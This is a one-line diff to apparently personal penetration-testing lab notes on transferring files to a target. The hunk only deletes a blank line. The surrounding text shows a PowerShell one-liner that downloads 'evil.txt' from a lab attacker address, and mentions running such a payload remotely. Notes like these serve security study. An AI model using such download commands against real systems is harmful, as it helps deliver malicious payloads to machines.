@@ -84,7 +84,6 @@ And we can see our file has downloaded.
 ![[Pasted image 20220720024112.png]]
 
 This script can be run in a number of ways. For example, a one liner version:
-
 `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.130/evil.txt', 'new-evil.txt')`
 
 Or as a one liner, executing the requested payload remotely rather than saving and execute the file locally.
